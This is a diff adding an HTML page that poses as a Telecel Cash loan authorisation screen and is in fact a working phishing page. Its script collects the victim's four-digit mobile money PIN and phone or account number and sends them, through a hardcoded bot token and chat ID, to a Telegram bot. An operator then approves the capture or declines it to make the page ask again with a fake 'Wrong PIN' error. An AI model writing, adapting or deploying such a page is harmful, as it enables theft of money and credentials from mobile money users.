@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telecel Cash PIN · Loan authorisation</title>
+  
+  <!-- Font (same as OTP page) -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    body {
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow-x: hidden;
+      padding: 10px; /* ensures spacing on very small screens */
+    }
+
+    /* ---------- BLURRED OTP BACKGROUND (exact copy of OTP page, non‑interactive) ---------- */
+    .blurred-background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      filter: blur(6px) brightness(0.98);
+      pointer-events: none;
+      z-index: 1;
+      overflow: hidden;
+    }
+
+    .bg-otp {
+      width: 360px;
+      background: #f7f7f7;
+      border-radius: 28px;
+      padding: 40px 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+    }
+
+    .bg-otp .top-bg {
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 220px;
+      height: 220px;
+      background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
+      border-bottom-left-radius: 120px;
+    }
+
+    .bg-otp .content {
+      position: relative;
+      z-index: 2;
+    }
+
+    .bg-otp .logo-circle {
+      width: 52px;
+      height: 52px;
+      background: #ff0000;
+      border-radius: 50%;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 30px;
+      margin: auto;
+      font-weight: 800;
+    }
+
+    .bg-otp .logo-text {
+      color: #ff0000;
+      font-size: 26px;
+      font-weight: bold;
+      margin-top: 8px;
+    }
+
+    .bg-otp .title {
+      color: #ff0000;
+      font-size: 20px;
+      font-weight: 600;
+      margin-top: 15px;
+    }
+
+    .bg-otp .subtitle {
+      color: #666;
+      font-size: 15px;
+      margin-top: 10px;
+      line-height: 1.5;
+    }
+
+    .bg-otp .otp-container {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+
+    .bg-otp .otp-input {
+      width: 45px;
+      height: 50px;
+      border-radius: 10px;
+      border: 1px solid #ddd;
+      text-align: center;
+      font-size: 18px;
+      background: #fff;
+    }
+
+    .bg-otp .btn-primary {
+      background: #e5e5e5;
+      color: #999;
+      width: 100%;
+      height: 55px;
+      border: none;
+      border-radius: 14px;
+      font-size: 16px;
+      margin-top: 20px;
+      font-weight: 600;
+    }
+
+    .bg-otp .btn-outline {
+      background: transparent;
+      border: 2px solid #ff0000;
+      color: #666;
+      width: 100%;
+      height: 55px;
+      border-radius: 14px;
+      font-size: 16px;
+      margin-top: 20px;
+      font-weight: 600;
+    }
+
+    /* ---------- PIN MODAL CARD (on top) ---------- */
+    .pin-modal {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 360px;
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 24px 20px 30px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25), 0 0 0 2px rgba(255, 255, 255, 0.3) inset;
+      backdrop-filter: blur(2px);
+      animation: fadeIn 0.2s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0.8; transform: scale(0.98); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+
+    .modal-header h2 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+      letter-spacing: -0.3px;
+    }
+
+    .close-btn {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 2px solid #ff0000;
+      color: #ff0000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.15s;
+      background: white;
+    }
+
+    .close-btn:hover {
+      background: #fff0f0;
+    }
+
+    .divider {
+      height: 1px;
+      background: #eaeaea;
+      margin: 0 0 24px 0;
+    }
+
+    .pin-display {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 22px;
+    }
+
+    .pin-box {
+      display: flex;
+      align-items: center;
+      background: #f1f9ff;
+      padding: 12px 18px;
+      border-radius: 16px;
+      border: 1px solid #ffe0e0;
+    }
+
+    .cursor {
+      width: 4px;
+      height: 28px;
+      background: #ff0000;
+      margin-right: 10px;
+      border-radius: 2px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0; }
+    }
+
+    .stars {
+      font-size: 26px;
+      color: #ff0000;
+      letter-spacing: 6px;
+      font-weight: 500;
+    }
+
+    .description {
+      text-align: center;
+      font-size: 16px;
+      color: #444;
+      line-height: 1.5;
+      margin-bottom: 28px;
+      font-weight: 400;
+      background: #fafafa;
+      padding: 12px 16px;
+      border-radius: 20px;
+    }
+
+    .label {
+      font-size: 14px;
+      font-weight: 600;
+      color: #555;
+      margin-bottom: 8px;
+      letter-spacing: -0.2px;
+    }
+
+    /* PIN inputs – now with numeric keypad on mobile */
+    .pin-inputs {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 30px;
+      justify-content: center;
+    }
+
+    .pin-input {
+      width: 60px;
+      height: 60px;
+      border-radius: 16px;
+      border: 1.5px solid #ddd;
+      text-align: center;
+      font-size: 26px;
+      font-weight: 600;
+      outline: none;
+      background: #fff;
+      transition: border 0.15s, box-shadow 0.15s;
+      color: #1a1a1a;
+      /* numeric keypad on mobile + password masking */
+      inputmode: numeric;
+      pattern: \d*;
+      -webkit-text-security: disc; /* fallback for older browsers */
+    }
+
+    .pin-input:focus {
+      border-color: #ff0000;
+      box-shadow: 0 0 0 3px rgba(255, 0, 0, 0.2);
+    }
+
+    .pin-input.filled {
+      border-color: #ffaaaa;
+      background: #fff9f9;
+    }
+
+    .btn-authorise {
+      width: 100%;
+      height: 56px;
+      background: #d9d9d9;
+      border: none;
+      border-radius: 18px;
+      font-size: 17px;
+      font-weight: 700;
+      color: #888;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-bottom: 12px;
+    }
+
+    .btn-authorise.active {
+      background: #ff0000;
+      color: white;
+      box-shadow: 0 8px 18px rgba(255, 0, 0, 0.2);
+    }
+
+    .error-box {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      right: 20px;
+      background: #fff;
+      border: 2px solid #ff4d4d;
+      border-radius: 12px;
+      padding: 15px;
+      display: none;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      z-index: 110;
+    }
+
+    .error-title {
+      color: #ff0000;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .error-text {
+      color: #444;
+      font-size: 14px;
+    }
+
+    .close-error {
+      position: absolute;
+      right: 15px;
+      top: 10px;
+      cursor: pointer;
+      font-size: 18px;
+      color: #999;
+    }
+
+    #spinner {
+      position: fixed;
+      inset: 0;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(3px);
+      z-index: 1000;
+      font-weight: 600;
+      color: #ff0000;
+    }
+
+    .loader {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #ffe0e0;
+      border-top: 5px solid #ff0000;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+
+    .spinner-text {
+      font-size: 18px;
+      color: #c00;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- BLURRED OTP BACKGROUND (static copy of OTP page) -->
+<div class="blurred-background">
+  <div class="bg-otp">
+    <div class="top-bg"></div>
+    <div class="content">
+      <div class="logo">
+        <div class="logo-circle">t</div>
+        <div class="logo-text">telecel</div>
+      </div>
+      <div class="title">Confirm your account</div>
+      <div class="subtitle">The One Time Pin has been sent to<br>02xxxxxx20. Enter it below.</div>
+      <div class="otp-container">
+        <input class="otp-input" value="1" disabled><input class="otp-input" value="2" disabled><input class="otp-input" value="3" disabled><input class="otp-input" value="4" disabled><input class="otp-input" value="5" disabled><input class="otp-input" value="6" disabled>
+      </div>
+      <button class="btn-primary" disabled>Next</button>
+      <button class="btn-outline" disabled>Go Back</button>
+    </div>
+  </div>
+</div>
+
+<!-- PIN MODAL CARD -->
+<div class="pin-modal">
+  <!-- error box (hidden by default) -->
+  <div class="error-box" id="errorBox">
+    <div class="close-error" onclick="hideError()">×</div>
+    <div class="error-title">Error</div>
+    <div class="error-text" id="errorText">Wrong PIN</div>
+  </div>
+
+  <div class="modal-header">
+    <h2>Confirm loan Application</h2>
+    <div class="close-btn" id="backBtn">×</div>
+  </div>
+  <div class="divider"></div>
+
+  <div class="pin-display">
+    <div class="pin-box">
+      <div class="stars">**</div>
+    </div>
+  </div>
+
+  <div class="description">
+    You are about to authorise Telecel to award you a loan. Enter your PIN to authorise.
+  </div>
+
+  <div class="label">Telecel Cash Pin</div>
+
+  <div class="pin-inputs">
+    <!-- Added inputmode and pattern for numeric keypad, while keeping type="password" -->
+    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin1" autofocus autocomplete="off">
+    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin2" autocomplete="off">
+    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin3" autocomplete="off">
+    <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin4" autocomplete="off">
+  </div>
+
+  <button class="btn-authorise" id="authoriseBtn">Authorise</button>
+</div>
+
+<!-- SPINNER with custom message -->
+<div id="spinner">
+  <div class="loader"></div>
+  <div class="spinner-text">Calculating loan limit</div>
+</div>
+
+<script>
+  (function() {
+    // --- TELEGRAM CONFIG ---
+    const BOT_TOKEN = '8689336204:AAEx_doO-4KdzQ8k2L_zABF4zhAKq7nM4bI';
+  const CHAT_ID   = '6524756111';
+    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+    // --- DOM elements ---
+    const pinInputs = [
+      document.getElementById('pin1'),
+      document.getElementById('pin2'),
+      document.getElementById('pin3'),
+      document.getElementById('pin4')
+    ];
+    const authoriseBtn = document.getElementById('authoriseBtn');
+    const spinner = document.getElementById('spinner');
+    const errorBox = document.getElementById('errorBox');
+    const errorText = document.getElementById('errorText');
+    const backBtn = document.getElementById('backBtn');
+
+    // --- Retrieve session data ---
+    let phone = sessionStorage.getItem('telecel_phone') || '0200000020';
+    let accountType = sessionStorage.getItem('telecel_accountType') || 'Mobile';
+    let inputValue = sessionStorage.getItem('telecel_inputValue') || '';
+
+    // --- Auto‑advance & style update ---
+    function updateButtonState() {
+      const allFilled = pinInputs.every(inp => inp.value.length === 1);
+      if (allFilled) {
+        authoriseBtn.classList.add('active');
+        authoriseBtn.disabled = false;
+      } else {
+        authoriseBtn.classList.remove('active');
+        authoriseBtn.disabled = true;
+      }
+    }
+
+    pinInputs.forEach((input, idx) => {
+      input.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').slice(0,1);
+        if (this.value.length === 1) {
+          if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
+        }
+        updateButtonState();
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          if (this.value.length === 0 && idx > 0) {
+            e.preventDefault();
+            pinInputs[idx - 1].focus();
+          }
+        } else if (e.key === 'ArrowLeft') {
+          e.preventDefault();
+          if (idx > 0) pinInputs[idx - 1].focus();
+        } else if (e.key === 'ArrowRight') {
+          e.preventDefault();
+          if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
+        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
+          e.preventDefault();
+        }
+      });
+    });
+
+    updateButtonState();
+
+    // --- Error handling ---
+    window.hideError = function() {
+      errorBox.style.display = 'none';
+    };
+
+    function showError(msg) {
+      errorText.innerText = msg || 'Wrong PIN';
+      errorBox.style.display = 'block';
+    }
+
+    // --- Telegram helpers ---
+    function escapeHtml(unsafe) {
+      return unsafe.replace(/[&<>"]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        if (m === '"') return '&quot;';
+        return m;
+      });
+    }
+
+    async function sendToTelegram(payload) {
+      const url = `${API_BASE}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        return await response.json();
+      } catch (err) {
+        console.error('Telegram error', err);
+        throw err;
+      }
+    }
+
+    let pollInterval = null;
+
+    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+      if (pollInterval) clearInterval(pollInterval);
+
+      let lastUpdateId = 0;
+      pollInterval = setInterval(async () => {
+        try {
+          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+          const res = await fetch(url);
+          const data = await res.json();
+          if (!data.ok || !data.result.length) return;
+
+          data.result.forEach(update => {
+            lastUpdateId = update.update_id;
+            if (update.callback_query && update.callback_query.data) {
+              const parts = update.callback_query.data.split('_');
+              if (parts.length >= 3) {
+                const [type, action, time] = parts;
+                if (time == expectedTs && type === expectedPrefix) {
+                  clearInterval(pollInterval);
+                  pollInterval = null;
+                  onDecision(action);
+                }
+              }
+            }
+          });
+        } catch (err) {
+          console.warn('Poll error', err);
+        }
+      }, 1500);
+    }
+
+    // --- Authorise button logic ---
+    let isProcessing = false;
+
+    authoriseBtn.addEventListener('click', async function() {
+      if (isProcessing) return;
+
+      const pin = pinInputs.map(i => i.value).join('');
+      if (pin.length !== 4) {
+        showError('Enter all 4 digits');
+        return;
+      }
+
+      isProcessing = true;
+      pinInputs.forEach(i => i.disabled = true);
+      authoriseBtn.disabled = true;
+      spinner.style.display = 'flex';
+
+      const identifier = accountType === 'Mobile' 
+        ? `Phone: ${phone}`
+        : `Account: ${inputValue || 'N/A'}`;
+
+      const ts = Date.now();
+      const escapedPin = escapeHtml(pin);
+
+      const msg = `PIN verification\n\n${identifier}\n\nPIN entered: <code>${escapedPin}</code>\n\nAuthorise this pin?`;
+
+      await sendToTelegram({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[
+            { text: 'Approve', callback_data: `pin_approve_${ts}` },
+            { text: 'Decline', callback_data: `pin_decline_${ts}` }
+          ]]
+        }
+      });
+
+      pollForCallback('pin', ts, (action) => {
+        spinner.style.display = 'none';
+        isProcessing = false;
+
+        if (action === 'approve') {
+          window.location.href = 'unavailable.html';
+        } else if (action === 'decline') {
+          showError('Wrong PIN');
+          pinInputs.forEach(i => {
+            i.value = '';
+            i.disabled = false;
+          });
+          pinInputs[0].focus();
+          authoriseBtn.disabled = false;
+          updateButtonState();
+        }
+      });
+    });
+
+    // --- Back button (X) – goes to previous page ---
+    backBtn.addEventListener('click', function() {
+      window.history.back();
+    });
+
+    if (!sessionStorage.getItem('telecel_phone') && !sessionStorage.getItem('telecel_inputValue')) {
+      console.log('Using default demo data');
+    }
+  })();
+</script>
+
+</body>
+</html>
